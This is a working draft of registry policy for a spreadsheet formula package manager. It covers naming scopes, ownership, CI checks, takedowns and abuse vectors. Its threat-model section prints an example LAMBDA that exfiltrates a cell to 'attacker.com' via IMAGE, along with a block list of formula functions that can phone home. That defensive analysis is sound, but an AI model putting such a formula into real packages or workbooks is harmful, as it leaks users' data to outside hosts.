# Formulary Registry Policy — Draft

This is a working doc, not final policy. Goal: think through the questions before the registry has real volume, set sensible defaults that scale with growth.

## Core principle

**Library authors should never have to touch a terminal if they don't want to.** Even for large/complex packages. The terminal is for power users; everything must also be doable through native in-spreadsheet UIs.

This is a hard constraint that shapes everything below. It means:
- The Excel add-in must support publish/extract/manage, not just install/browse.
- GSheets needs an equivalent (deferred until either the GSheets add-on works or we build a web-app alternative — see "GSheets gap" below).
- CI checks have to work without author intervention (no "fix it locally and push again" loops; the in-app publish flow must surface errors clearly and let the author fix them in place).
- Testing must cover both terminal and in-app paths cross-platform.

## Phase 1 — Closed Beta (now)

**Audience:** Astral (GSheets) + Excel esports testers (~5 people, terminal-tolerant).

**Submission model:** Manual review by Astral, no CI yet. PRs from `formulary publish` (terminal) or eventually from the add-in's publish UI.

**Why this is OK temporarily:** The first 5 authors are explicitly the people willing to use a terminal. We use this phase to validate the registry shape and the publish pipeline before automating. Phase 2 (the no-terminal phase) is the real target and starts as soon as we have an in-app publish flow.

---

## Phase 2 — Open Beta (when 10+ external authors want in)

This is when policy starts mattering.

### Submission model

| Option | Pros | Cons |
|---|---|---|
| **Anyone via PR + auto-merge on CI pass** | Low friction, scales | Spam, typosquatting, no human eye |
| **Anyone via PR + manual review** | Quality control | Doesn't scale, bottleneck |
| **Trusted authors self-merge, others gated** | Hybrid — fast for known people, gated for newcomers | Need a "trusted" list |
| **Reservation system** (claim a name, then publish to it) | Prevents land-grabs | More moving parts |

**Recommendation:** Trusted-author hybrid. Astral starts with a small allowlist. New authors submit a PR; Astral approves the first one (which adds them to the allowlist), then they can self-merge subsequent versions of their packages.

### Naming and namespacing (forward-looking)

We need to design for scale beyond initial expectations. Two-tier namespace system:

**Tier 1: Blessed flat names** for infrastructure packages.
- `charter`, `formulary`, `lattice`, etc.
- Reserved from day one, only the maintainers can publish them
- Used for the small set of "everyone depends on this" packages
- Gating is manual: Astral approves additions to the blessed list

**Tier 2: Scoped names** for everyone else.
- Format: `@scope/package` (npm style — well-understood, hierarchical)
- First publish under a scope claims that scope for the publisher
- Scopes can have multiple owners
- Org accounts on GitHub map naturally to scopes

**Why scoped from day one:** Other package managers (npm, PyPI, RubyGems) all hit problems by starting flat-only and bolting on scopes/namespaces later. The migration is painful and forever leaves a bimodal ecosystem. Starting with scopes from the beginning means:
- No land-grab race for names
- Org/team boundaries are explicit
- Easier to handle ownership transfer (transfer the scope, not individual packages)
- Transitive packages (`@user/util`) live alongside infrastructure (`charter`) without confusion

**Validation rules:**
- Scope: lowercase, hyphens, no underscores, 2–32 chars
- Package: same rules
- Blessed names: same rules but in the blessed list
- No name should match an existing one with edit distance ≤2 (typosquat protection) — soft warning at publish, hard reject for known-popular names

**Migration plan for existing packages:**
- Charter (the only published package now) stays flat as a blessed infrastructure package
- Any new package by anyone other than Astral must be scoped from day one
- If someone wants `foo`, they publish `@theirscope/foo` and we can alias later if it becomes popular enough to be blessed

### Ownership

- **Per-scope ownership**, not per-package. Owning `@astral` means owning every package under it.
- **Multiple owners per scope** — supports teams
- **Transfer:** any current owner can add or remove other owners. The last owner of a scope can transfer the whole scope to another GitHub account/org via a signed PR.
- **Abandoned scopes:** marked unmaintained after a year of inactivity, but never reclaimed. Users can fork into their own scope.

### Anti-squatting

- Unpublished scopes cannot be reserved without a real release
- Scopes that publish a package and then never update it are still owned (no auto-recycling)
- The blessed list is curated; getting on it requires Astral's approval and a high bar for value

### CI checks (replace the Python script in `.github/scripts/`)

Required for any PR to be mergeable:
- `manifest.json` parses, has all required fields
- `functions.json` parses, all entries have `definition`
- Manifest's `exports` matches `functions.json` keys
- `integrity` in `meta.json` matches sha256 of artifact
- Artifact path follows convention `packages/{name}/{version}/{name}-{version}.fpkg`
- New version is greater than existing latest (no rewriting history)
- Owner field on PR matches an existing package owner (for updates) or new entry (for new packages)
- Package only modifies its own files (a PR for `foo` can't touch `bar/`)

### Versioning

- **Semver enforced** (already in `validateManifest`)
- **Versions are immutable** once merged. No deletion, no rewriting (npm-style policy).
  - Exception: security vulnerabilities or accidental PII publication. Astral can yank a version (mark as "do not install" but keep the artifact for archival).
- **Deprecation:** mark a version as deprecated with a message; CLI shows a warning on install but still works.

---

## Abuse vectors (formula-specific)

**This is the part I want you to look at carefully** because formulas have unusual capabilities for a "package format."

### Data exfiltration via formulas

Excel and GSheets both have functions that can phone home:

| Function | Platform | Risk |
|---|---|---|
| `WEBSERVICE(url)` | Excel | HTTP GET to arbitrary URL — can send cell data via query string |
| `IMAGE(url)` | Excel/GS | Fetches an image — same exfiltration via URL params |
| `HYPERLINK(url, text)` | Both | Less direct, but a clicked link reveals user activity |
| `IMPORTDATA(url)` | GSheets | Fetches CSV — beacon-style |
| `IMPORTHTML/IMPORTXML/IMPORTRANGE` | GSheets | Same |

A malicious LAMBDA could read other cells in the workbook and exfiltrate them. e.g.:

```
=LAMBDA(x, IMAGE("https://attacker.com/log?data=" & A1))
```

The user calls `=BAD(123)` thinking it's a math function, but A1's value (a password? PII?) goes to the attacker.

**Mitigations to consider:**

1. **Static analysis at publish time.** Reject packages whose functions reference any of `WEBSERVICE`, `IMAGE`, `HYPERLINK`, `IMPORT*`. Easy to enforce, blocks the obvious cases.
2. **Allowlist of "blessed" functions** packages can use. Stricter but limits legitimate use cases.
3. **Warn at install time.** Show the user "this package uses WEBSERVICE — only install if you trust the author."
4. **Sandbox display.** When browsing, show what URLs/external calls a package makes.

I'd go with **#1 + #3**: reject packages that use exfiltration functions in CI, but if anyone needs them legitimately, they go through manual review and the install path warns.

### Typosquatting

`charter` vs `charterr`, `charter-utils` vs `charter_utils`, etc.

**Mitigations:**
- Maintain a list of "popular" packages; flag PRs that create names within edit distance ≤2 of one of them
- Reserve common typos manually (`chartr`, `charterr`, etc. point to canonical)
- Show install warnings: "Did you mean `charter`?"

Realistic for now: just be aware. With 10 packages, typosquatting isn't the threat. Revisit at 100+.

### Malicious updates (account compromise)

Someone gets pwned and pushes a malicious version of a popular package.

**Mitigations:**
- 2FA required for trusted authors (enforced via GitHub)
- All version updates must come from registered owners
- Public diff visibility on every PR (since it's GitHub) means surveillance is possible
- For very popular packages (charter, etc.), require manual review even from trusted authors

### Name hijacking

Author abandons a package, someone else claims the name and publishes a malicious version.

**Mitigations:**
- Names are not transferable without explicit handoff (PR with both old and new owners signing off)
- If a package is unmaintained, mark it deprecated rather than letting the name be re-used

---

## Privacy considerations

### What's exposed in the registry

- **Owners** — GitHub usernames are public anyway
- **Function definitions** — by definition public (it's a package)
- **Dependencies** — public (needed for resolution)
- **Integrity hashes** — fine to expose

### What's exposed in user workbooks

When a user installs packages, the lockfile in their workbook reveals which packages they have. If they share the workbook:
- The recipient sees the dependency list
- This is the same as `package-lock.json` in npm — generally fine

**Concern:** if the workbook is shared with sensitive cells next to a Formulary lockfile sheet, someone could correlate "user X uses package Y" with their data. Probably not a real concern for spreadsheets but worth noting.

### Telemetry

**Position: no telemetry.** The CLI doesn't phone home. No install counts, no analytics. Authors don't know how many users they have, but the tradeoff is worth it for trust.

If we want install counts later, do it via static analysis (download counts on the artifact URLs from CDN logs), not client-side reporting.

---

## Registry takedown policy

When can a package be removed?

| Reason | Action | Who decides |
|---|---|---|
| Legal (DMCA, court order) | Remove immediately | Astral, no appeal |
| Malicious (data exfiltration, etc.) | Remove + ban author | Astral; community can flag |
| Violation of CI rules retroactively | Yank version, leave package | Astral |
| Author requests removal | Yank version (mark deprecated), don't delete | Author + Astral |
| Spam/abuse | Remove + ban author | Astral |
| Inactivity | Don't remove. Mark unmaintained if author confirms. | N/A |

**Yank vs delete:** prefer yank. Deleting versions breaks lockfiles for existing users. Yanking marks a version as "do not install for new users" but keeps the artifact reachable so existing installs don't break.

---

## Resolved decisions

1. **Phase 1 is manual** — but only because the Phase 1 audience is terminal-tolerant. Phase 2 starts as soon as in-app publish exists.
2. **Exfiltration functions blocked in CI from day one** — `WEBSERVICE`, `IMAGE`, `HYPERLINK`, `IMPORTDATA`, `IMPORTHTML`, `IMPORTXML`, `IMPORTRANGE` cannot appear in package functions. Static check on functions.json before merge.
3. **Forward-looking namespace design** — scoped names (`@scope/package`) from day one, plus a small blessed flat namespace for infrastructure.

## Resolved (continued)

4. **GSheets gap:** accept it honestly. GSheets-primary authoring requires the terminal (CLI + Playwright) until Google ships a Named Functions API. When that happens, it collapses entirely — see "Future-proofing for GSheets API" below.

5. **Cross-platform package authoring:**
   - Most packages won't need platform overrides (charter-style Excel-only or simple universal)
   - For the few that do: the Excel add-in's Publish UI gets a "Platform Overrides" section where authors can edit `functions.{platform}.json` as text
   - Author can't *test* the GSheets override inside Excel (until the API ships), but can author and publish it
   - Inverse case (GSheets-primary author maintaining Excel overrides) requires the terminal until the API ships

6. **OAuth providers — all three, complementary not competing:**
   - **Microsoft:** automatic in Office Add-in context, identifies the Excel user
   - **Google:** Sheets API for GSheets operations (CLI uses this today)
   - **GitHub:** registry interactions (publish), used by both CLI and add-in
   - The add-in adds a GitHub OAuth popup flow, stores the token in add-in localStorage
   - CLI continues to use `gh` CLI for the same purpose

7. **Test strategy — three layers:**
   - **Layer 1 (pure unit tests):** manifest validation, bundle parse/pack, registry update generation, resolver, extract logic. CI runs every commit.
   - **Layer 2 (mocked adapter):** test commands against a fake `PlatformAdapter`. Catches 80% of bugs without needing real Excel/GSheets. CI runs every commit.
   - **Layer 3 (live smoke):** real xlsx files via in-memory `ExcelAdapter`; sandboxed test GSheet for the GSheets adapter. Runs before releases, not every commit.
   - **Architectural implication:** the Excel add-in's business logic must move into testable modules. The taskpane is a thin shell over pure functions; DOM/Office calls live only at the edges. This is also good architecture independent of testing.

## Still open

1. **Where does the policy live?** Probably `POLICY.md` in the registry repo, surfaced from the `formulary publish` flow (terminal and in-app), and linked from the registry README.

## Future-proofing for the GSheets API

Whenever Google ships a Named Functions API (real, programmatic CRUD for LAMBDAs), the GSheets gap collapses:

- A new `GSheetsApiAdapter` implementing `PlatformAdapter` replaces the Playwright-based one
- The CLI swaps adapters; commands don't change
- The Excel add-in can now push GSheets overrides directly via API (still without terminal)
- The GSheets add-on becomes viable to build (was always blocked on this)
- Cross-platform authoring becomes trivial — author on either platform, push overrides via API

**Architectural commitment:** keep all GSheets-specific code behind the `PlatformAdapter` interface so this swap is a file replacement, not a rewrite. Already done — `GSheetsAdapter` is the only place that knows about Playwright. Commands and registry code are agnostic.

**What we throw away when this happens:**
- The Playwright dependency and the entire `gsheets-driver.ts` / `gsheets-adapter.ts` UI scraping
- The two-step auth flow (Playwright profile + OAuth) collapses to OAuth-only
- The slow per-function UI automation

**What stays:**
- Bundle format, registry format, manifest, resolver, publish backend
- Excel add-in (gains the ability to push GSheets overrides natively)
- All commands

---

## New work items created by no-terminal requirement

In rough priority order (after extract, which is still P0):

| Item | Reason |
|---|---|
| **Excel add-in: extract** | Read functions from current workbook, populate a local-equivalent state in the add-in |
| **Excel add-in: publish UI** | Manifest editor + GitHub OAuth + push to registry backend |
| **CI for new format** | Validate manifest, integrity, exports match, no exfiltration functions |
| **GSheets gap doc** | Be explicit that GSheets is terminal-only for now |
| **Cross-platform test strategy** | How do we verify the in-app publish path works without manual Excel runs? |
| **Scoped name validation** | Update `validateManifest` to allow `@scope/name` |
| **Publish backend abstraction** | Already started (RegistryBackend interface). Add-in uses the same interface. |
